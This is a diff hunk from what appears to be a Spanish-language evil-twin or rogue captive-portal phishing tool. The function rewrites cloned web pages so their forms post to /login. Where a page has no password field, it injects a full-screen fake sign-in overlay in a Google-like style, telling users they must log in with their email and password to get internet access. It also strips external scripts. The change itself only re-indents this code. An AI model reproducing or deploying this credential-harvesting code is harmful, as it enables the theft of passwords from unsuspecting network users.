@@ -244,35 +244,35 @@ def _adapt_form(html_text, _log):
                 pwd["name"] = "password"
             _log("[+] Formulario adaptado → POST /login")
         else:
-        _log("[!] Sin form con password: inyectando overlay")
-        overlay = (
-            '<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;'
-            'background:rgba(0,0,0,0.72);z-index:99999;display:flex;align-items:center;'
-            'justify-content:center;font-family:sans-serif;">'
-            '<div style="background:#fff;border-radius:10px;padding:40px 36px;width:340px;'
-            'text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);">'
-            '<h2 style="margin:0 0 6px;font-size:22px;color:#202124;font-weight:500;">'
-            'Inicia sesion para continuar</h2>'
-            '<p style="margin:0 0 24px;font-size:13px;color:#5f6368;">'
-            'Necesitas identificarte para acceder a internet</p>'
-            '<form method="POST" action="/login">'
-            '<input name="email" type="email" placeholder="Correo electronico" required '
-            'style="display:block;width:100%;padding:11px 12px;margin-bottom:12px;'
-            'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
-            '<input name="password" type="password" placeholder="Contrasena" required '
-            'style="display:block;width:100%;padding:11px 12px;margin-bottom:20px;'
-            'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
-            '<button type="submit" '
-            'style="width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;'
-            'padding:11px;font-size:15px;font-weight:500;cursor:pointer;">'
-            'Acceder</button>'
-            '</form>'
-            '</div>'
-            '</div>'
-        )
-        body = soup.find("body")
-        if body:
-            body.insert(0, BeautifulSoup(overlay, "html.parser"))
+            _log("[!] Sin form con password: inyectando overlay")
+            overlay = (
+                '<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;'
+                'background:rgba(0,0,0,0.72);z-index:99999;display:flex;align-items:center;'
+                'justify-content:center;font-family:sans-serif;">'
+                '<div style="background:#fff;border-radius:10px;padding:40px 36px;width:340px;'
+                'text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);">'
+                '<h2 style="margin:0 0 6px;font-size:22px;color:#202124;font-weight:500;">'
+                'Inicia sesion para continuar</h2>'
+                '<p style="margin:0 0 24px;font-size:13px;color:#5f6368;">'
+                'Necesitas identificarte para acceder a internet</p>'
+                '<form method="POST" action="/login">'
+                '<input name="email" type="email" placeholder="Correo electronico" required '
+                'style="display:block;width:100%;padding:11px 12px;margin-bottom:12px;'
+                'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
+                '<input name="password" type="password" placeholder="Contrasena" required '
+                'style="display:block;width:100%;padding:11px 12px;margin-bottom:20px;'
+                'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
+                '<button type="submit" '
+                'style="width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;'
+                'padding:11px;font-size:15px;font-weight:500;cursor:pointer;">'
+                'Acceder</button>'
+                '</form>'
+                '</div>'
+                '</div>'
+            )
+            body = soup.find("body")
+            if body:
+                body.insert(0, BeautifulSoup(overlay, "html.parser"))
 
     for tag in soup.find_all("script", src=True):
         tag.decompose()
